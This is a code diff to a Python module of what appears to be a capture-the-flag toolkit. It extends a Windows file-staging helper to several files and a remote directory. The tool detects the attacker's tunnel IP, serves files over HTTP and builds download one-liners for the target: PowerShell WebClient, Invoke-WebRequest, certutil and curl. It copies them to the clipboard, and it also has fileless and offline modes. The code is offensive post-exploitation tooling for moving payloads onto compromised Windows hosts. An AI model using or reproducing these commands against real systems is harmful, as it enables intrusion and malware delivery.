@@ -24,13 +24,6 @@ W_BOLD = '\033[1m'
 # =========================================================
 
 def detect_ip():
-    """
-    Attempt to detect attacker IP.
-    """
-
-    # -----------------------------------------------------
-    # tun0
-    # -----------------------------------------------------
 
     try:
 
@@ -46,10 +39,6 @@ def detect_ip():
 
     except Exception:
         pass
-
-    # -----------------------------------------------------
-    # fallback
-    # -----------------------------------------------------
 
     try:
 
@@ -84,32 +73,49 @@ def copy_clipboard(text):
 
 
 # =========================================================
-# COMMAND GENERATORS
+# COMMAND BUILDERS
 # =========================================================
 
-def build_http_commands(ip, port, filename):
+def build_http_commands(
+    ip,
+    port,
+    filename,
+    remote_dir=None,
+):
+
+    if remote_dir:
+
+        remote_path = (
+            f"{remote_dir}\\{filename}"
+        )
+
+    else:
+
+        remote_path = (
+            f".\\\\{filename}"
+        )
 
     ps1 = (
         f"(New-Object Net.WebClient).DownloadFile("
         f"'http://{ip}:{port}/{filename}',"
-        f"'.\\\\{filename}')"
+        f"'{remote_path}')"
     )
 
     iwr = (
         f"Invoke-WebRequest "
         f"http://{ip}:{port}/{filename} "
-        f"-OutFile .\\\\{filename}"
+        f"-OutFile \"{remote_path}\""
     )
 
     certutil = (
         f"certutil -urlcache -f "
         f"http://{ip}:{port}/{filename} "
-        f"{filename}"
+        f"\"{remote_path}\""
     )
 
     curl = (
         f"curl http://{ip}:{port}/{filename} "
-        f"-o {filename}"
+        f"-o \"{remote_path}\""
     )
 
     return {
@@ -149,17 +155,18 @@ def build_offline_command(filepath):
 # HTTP SERVER
 # =========================================================
 
-def serve_http(filepath, port=8080):
+def serve_http(directory, port=8080):
 
-    filepath = Path(filepath).resolve()
-
-    directory = filepath.parent
+    directory = Path(directory).resolve()
 
     os.chdir(directory)
 
     handler = http.server.SimpleHTTPRequestHandler
 
-    httpd = socketserver.TCPServer(
+    class ReusableTCPServer(socketserver.TCPServer):
+        allow_reuse_address = True
+
+    httpd = ReusableTCPServer(
         ("0.0.0.0", port),
         handler
     )
@@ -178,34 +185,52 @@ def serve_http(filepath, port=8080):
 # MODES
 # =========================================================
 
-def mode_http(filepath, ip, port):
-
-    filename = Path(filepath).name
-
-    cmds = build_http_commands(
-        ip,
-        port,
-        filename
-    )
-
+def mode_http(
+    files,
+    ip,
+    port,
+    remote_dir=None,
+):
     print(f"\n{M}=== HTTP ==={W}\n")
 
-    for name, cmd in cmds.items():
+    clipboard = []
 
-        print(f"{B}[{name}]{W}")
-        print(cmd)
-        print()
+    for filepath in files:
 
-    copy_clipboard(cmds["iwr"])
+        filename = Path(filepath).name
 
-    print(f"{G}→ helper copied to clipboard{W}")
+        cmds = build_http_commands(
+            ip,
+            port,
+            filename,
+            remote_dir,
+        )
+
+        print(f"{C}{filename}{W}\n")
+
+        for name, cmd in cmds.items():
+
+            print(f"{B}[{name}]{W}")
+            print(cmd)
+            print()
+
+        clipboard.append(cmds["iwr"])
+
+    copy_clipboard(
+        "\n".join(clipboard)
+    )
+
+    print(f"{G}→ helpers copied to clipboard{W}")
+
+    directory = Path(files[0]).parent
 
     print(
-        f"\n{Y}[*] Serving {filename} "
+        f"\n{Y}[*] Serving "
+        f"{len(files)} file(s) "
         f"at http://{ip}:{port}/{W}"
     )
 
-    return serve_http(filepath, port)
+    return serve_http(directory, port)
 
 
 def mode_fileless(filepath, ip, port):
@@ -231,24 +256,38 @@ def mode_fileless(filepath, ip, port):
         f"at http://{ip}:{port}/{W}"
     )
 
-    return serve_http(filepath, port)
+    return serve_http(
+        Path(filepath).parent,
+        port,
+    )
 
 
-def mode_offline(filepath):
-
-    cmd = build_offline_command(filepath)
+def mode_offline(files):
 
     print(f"\n{M}=== OFFLINE ==={W}\n")
 
-    print(cmd)
+    clipboard = []
 
-    copy_clipboard(cmd)
+    for filepath in files:
 
-    print(f"\n{G}→ helper copied to clipboard{W}")
+        cmd = build_offline_command(filepath)
+
+        print(f"{C}{Path(filepath).name}{W}\n")
+
+        print(cmd)
+        print()
+
+        clipboard.append(cmd)
+
+    copy_clipboard(
+        "\n\n".join(clipboard)
+    )
+
+    print(f"{G}→ helpers copied to clipboard{W}")
 
 
 # =========================================================
-# INTERACTIVE MENU
+# MENU
 # =========================================================
 
 def choose_mode():
@@ -276,20 +315,30 @@ def choose_mode():
 # PUBLIC API
 # =========================================================
 
-def stage_windows_file(
-    filepath,
+def stage_windows_files(
+    files,
     method=None,
     ip=None,
     port=8080,
+    remote_dir=None,
 ):
 
-    filepath = Path(filepath)
+    files = [
+        Path(f).resolve()
+        for f in files
+    ]
 
-    if not filepath.exists():
+    for filepath in files:
 
-        print(f"\n{R}[!] File not found.{W}")
+        if not filepath.exists():
 
-        return
+            print(
+                f"\n{R}[!] File not found:{W}"
+            )
+
+            print(f"  {filepath}")
+
+            return
 
     if not ip:
         ip = detect_ip()
@@ -300,16 +349,17 @@ def stage_windows_file(
     if not method:
         return
 
-    # -----------------------------------------------------
+    # =====================================================
     # HTTP
-    # -----------------------------------------------------
+    # =====================================================
 
     if method == "http":
 
         server = mode_http(
-            filepath,
+            files,
             ip,
             port,
+            remote_dir,
         )
 
         try:
@@ -317,14 +367,23 @@ def stage_windows_file(
         finally:
             server.shutdown()
 
-    # -----------------------------------------------------
+    # =====================================================
     # FILELESS
-    # -----------------------------------------------------
+    # =====================================================
 
     elif method == "fileless":
 
+        if len(files) > 1:
+
+            print(
+                f"\n{R}[!] "
+                f"Fileless mode only supports one file.{W}"
+            )
+
+            return
+
         server = mode_fileless(
-            filepath,
+            files[0],
             ip,
             port,
         )
@@ -334,32 +393,93 @@ def stage_windows_file(
         finally:
             server.shutdown()
 
-    # -----------------------------------------------------
+    # =====================================================
     # OFFLINE
-    # -----------------------------------------------------
+    # =====================================================
 
     elif method == "offline":
 
-        mode_offline(filepath)
+        mode_offline(files)
 
 
 # =========================================================
-# CLI ENTRY
+# BACKWARD COMPAT
+# =========================================================
+
+def stage_windows_file(
+    filepath,
+    method=None,
+    ip=None,
+    port=8080,
+    remote_dir=None,
+):
+
+    return stage_windows_files(
+        [filepath],
+        method,
+        ip,
+        port,
+        remote_dir,
+    )
+
+
+# =========================================================
+# CLI
 # =========================================================
 
 def run(data=None, cred=None, args=None):
 
-    filepath = getattr(args, "file", None)
+    files = []
 
-    if not filepath:
+    # =====================================================
+    # MULTI FILE
+    # =====================================================
+
+    arg_files = getattr(args, "files", None)
+
+    if arg_files:
+
+        if isinstance(arg_files, str):
+
+            files.append(arg_files)
+
+        else:
+
+            files.extend(arg_files)
+
+    # =====================================================
+    # SINGLE FILE
+    # =====================================================
+
+    arg_file = getattr(args, "file", None)
+
+    if arg_file:
+
+        files.append(arg_file)
+
+    # =====================================================
+    # FAIL
+    # =====================================================
+
+    if not files:
 
         print(
             f"\n{R}[!] Usage:{W} "
-            f"ctf dropw <file>"
+            f"ctf dropw <file1> [file2] [file3]"
         )
 
         return data
 
-    stage_windows_file(filepath)
+    # =====================================================
+    # DEDUP
+    # =====================================================
+
+    files = list(dict.fromkeys(files))
+
+    # =====================================================
+    # STAGE
+    # =====================================================
+
+    stage_windows_files(files)
 
     return data
